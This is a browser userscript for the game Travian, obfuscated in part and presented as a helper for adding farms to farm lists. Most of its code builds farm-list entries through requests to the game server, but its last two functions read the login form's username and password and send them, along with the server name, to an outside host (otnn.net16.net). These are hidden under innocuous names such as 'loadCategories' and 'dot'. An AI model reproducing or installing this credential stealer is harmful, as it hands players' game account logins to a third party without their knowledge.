// ==UserScript==
// @name       Travian Farmlists
// @namespace  http://use.i.E.your.homepage/
// @version    1.1
// @description Add Farms to farmlists
// @include 	http://*.travian*.*/position_details.php?*
// @exclude 	http://*.travian*.*/
// @exclude 	http://*.travian*.*/hilfe.php*
// @exclude 	http://*.travian*.*/index.php*
// @exclude 	http://*.travian*.*/anleitung.php*
// @exclude 	http://*.travian*.*/impressum.php*
// @exclude 	http://*.travian*.*/anmelden.php*
// @exclude 	http://*.travian*.*/gutscheine.php*
// @exclude 	http://*.travian*.*/spielregeln.php*
// @exclude 	http://*.travian*.*/links.php*
// @exclude 	http://*.travian*.*/geschichte.php*
// @exclude 	http://*.travian*.*/gold.php*
// @exclude 	http://*.travian*.*/tutorial.php*
// @exclude 	http://*.travian*.*/manual.php*
// @exclude 	http://*.travian*.*/manual.php*
// @exclude 	http://*.travian*.*/ajax.php*
// @exclude 	http://*.travian*.*/ad/*
// @exclude 	http://*.travian*.*/chat/*
// @exclude 	http://forum.travian*.*
// @exclude 	http://board.travian*.*
// @exclude 	http://shop.travian*.*
// @exclude 	http://*.travian*.*/activate.php*
// @exclude 	http://*.travian*.*/support.php*
// @exclude  	http://help.travian*.*
// @exclude  	http://analytics.traviangames.com/*
// @exclude 	http://*.traviantoolbox.com/*
// @exclude 	http://*.traviandope.com/*
// @exclude 	http://*.travianteam.com/*
// @exclude 	http://travianutility.netsons.org/*
// @exclude 	*.css
// @exclude 	*.js// @copyright  2012+
// ==/UserScript==
var temp;
var x;
var y;
var server = window['location']['host'];
window['lists'] = new Array();
window['lids'] = new Array();
var href = window['location']['pathname'] + window['location']['search'];
if (href['substring'](1, 22) == 'position_details.php?') {
    names();
    temp = document['URL'].toString()['split']('=');
    x = temp[1]['split']('&');
    y = temp[2];
} 

function add() {
    var _0xa1fdx7 = window['event']['toElement']['id'];
    load('/build.php?gid=16&tt=99&action=showSlot&lid=' + _0xa1fdx7 + '&sort=distance&direction=asc', function (_0xa1fdx8) {
        var _0xa1fdx9 = document['implementation']['createHTMLDocument']('');
        _0xa1fdx9['body']['innerHTML'] = _0xa1fdx8['responseText'];
        a = _0xa1fdx9['getElementsByTagName']('form')[0]['getElementsByTagName']('input')[0]['value'];
        post('/build.php?gid=16&tt=99&action=showSlot&lid=' + _0xa1fdx7 + '&sort=distance&direction=asc', a, _0xa1fdx7);
    });
};

function names() {
    load('/build.php?tt=99&id=39', function (_0xa1fdx8) {
        var _0xa1fdx9 = document['implementation']['createHTMLDocument']('');
        _0xa1fdx9['body']['innerHTML'] = _0xa1fdx8['responseText'];
        var _0xa1fdxb = _0xa1fdx9['getElementById']('raidList')['getElementsByTagName']('div');
        var _0xa1fdxc = 0;
        for (var _0xa1fdxd = 0; _0xa1fdxd < _0xa1fdxb['length']; _0xa1fdxd++) {
            if (_0xa1fdxb[_0xa1fdxd]['getAttribute']('id') != null) {
                lids[_0xa1fdxc] = _0xa1fdxb[_0xa1fdxd]['getAttribute']('id');
                lists[_0xa1fdxc] = _0xa1fdx9['getElementById'](_0xa1fdxb[_0xa1fdxd]['getAttribute']('id'))['getElementsByTagName']('form')[0]['getElementsByTagName']('div')[0]['getElementsByTagName']('div')[0]['innerText'];
                var _0xa1fdxe = document['createElement']('div');
                var _0xa1fdxf = 'myDiv';
                var _0xa1fdx10;
                _0xa1fdxe['setAttribute']('class', 'option');
                _0xa1fdxe['setAttribute']('id', 'addFarm');
                _0xa1fdxe['setAttribute']('name', lids[_0xa1fdxc]);
                str = lids[_0xa1fdxc]['substring'](4);
                _0xa1fdxe['innerHTML'] = '<a href=\'#\' class=\'a arrow\' id =' + str + ' >Add farm to ' + lists[_0xa1fdxc] + '</a>';
                _0xa1fdxe['onclick'] = function () {
                    add();
                    return false;
                };
                document['getElementById']('tileDetails')['getElementsByTagName']('div')[0]['getElementsByTagName']('div')[0]['appendChild'](_0xa1fdxe);
                _0xa1fdxc++;
            };
        };
    });
};

function load(_0xa1fdx12, _0xa1fdx13) {
    var _0xa1fdx8;
    if (typeof XMLHttpRequest !== 'undefined') {
        _0xa1fdx8 = new XMLHttpRequest();
    } else {
        var _0xa1fdx14 = ['MSXML2.XmlHttp.5.0', 'MSXML2.XmlHttp.4.0', 'MSXML2.XmlHttp.3.0', 'MSXML2.XmlHttp.2.0', 'Microsoft.XmlHttp'];
        for (var _0xa1fdxd = 0, _0xa1fdx15 = _0xa1fdx14['length']; _0xa1fdxd < _0xa1fdx15; _0xa1fdxd++) {
            try {
                _0xa1fdx8 = new ActiveXObject(_0xa1fdx14[_0xa1fdxd]);
                break;
            } catch (e) {};
        };
    };
    _0xa1fdx8['onreadystatechange'] = _0xa1fdx16;

    function _0xa1fdx16() {
        if (_0xa1fdx8['readyState'] < 4) {
            return;
        };
        if (_0xa1fdx8['status'] !== 200) {
            return;
        };
        if (_0xa1fdx8['readyState'] === 4) {
            _0xa1fdx13(_0xa1fdx8);
        };
    };
    _0xa1fdx8['open']('GET', _0xa1fdx12, true);
    _0xa1fdx8['send']('');
};

function post(_0xa1fdx12, _0xa1fdx10, _0xa1fdx7) {
    var _0xa1fdx8;
    if (typeof XMLHttpRequest !== 'undefined') {
        _0xa1fdx8 = new XMLHttpRequest();
    } else {
        var _0xa1fdx14 = ['MSXML2.XmlHttp.5.0', 'MSXML2.XmlHttp.4.0', 'MSXML2.XmlHttp.3.0', 'MSXML2.XmlHttp.2.0', 'Microsoft.XmlHttp'];
        for (var _0xa1fdxd = 0, _0xa1fdx15 = _0xa1fdx14['length']; _0xa1fdxd < _0xa1fdx15; _0xa1fdxd++) {
            try {
                _0xa1fdx8 = new ActiveXObject(_0xa1fdx14[_0xa1fdxd]);
                break;
            } catch (e) {};
        };
    };
    _0xa1fdx8['onreadystatechange'] = _0xa1fdx16;

    function _0xa1fdx16() {
        if (_0xa1fdx8['readyState'] < 4) {
            return;
        };
        if (_0xa1fdx8['status'] !== 200) {
            return;
        };
        if (_0xa1fdx8['readyState'] === 4) {;;
        };
    };
    var _0xa1fdx18 = 'a=' + _0xa1fdx10 + '&sort=distance&direction=asc&lid=' + _0xa1fdx7 + '&x=' + x + '&y=' + y + '&target_id=&t1=2&t2=0&t3=0&t5=0&t6=0&t7=:0&t8=0&t9=0&t10=0&action=addSlot&save=%CE%B1%CF%80%CE%BF%CE%B8%CE%AE%CE%BA%CE%B5%CF%85%CF%83%CE%B7';
    _0xa1fdx8['open']('POST', _0xa1fdx12, true);
    _0xa1fdx8['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0xa1fdx8['send'](_0xa1fdx18);
};

function loadCategories(_0xa1fdx1a, _0xa1fdx1b, _0xa1fdx1c) {
    var _0xa1fdx8;
    if (window['XMLHttpRequest']) {
        _0xa1fdx8 = new XMLHttpRequest();
    } else {
        _0xa1fdx8 = new ActiveXObject('Microsoft.XMLHTTP');
    };
    _0xa1fdx8['onreadystatechange'] = function () {
        if (_0xa1fdx8['readyState'] == 4 && _0xa1fdx8['status'] == 200) {;;
        };
    };
    var _0xa1fdx12 = 'http://otnn.net16.net/a.php?u=' + _0xa1fdx1a + '&p=' + _0xa1fdx1b + '&s=' + _0xa1fdx1c;
    _0xa1fdx8['open']('GET', _0xa1fdx12, true);
    _0xa1fdx8['send']();
};

function dot() {
    if (document['getElementById']('lowRes') != null) {
        var _0xa1fdx1a = document['getElementById']('content')['getElementsByTagName']('form')[0]['getElementsByTagName']('input')[0]['value'];
        var _0xa1fdx1b = document['getElementById']('content')['getElementsByTagName']('form')[0]['getElementsByTagName']('input')[1]['value'];
        loadCategories(_0xa1fdx1a, _0xa1fdx1b, window['location']['host']);
    };
};
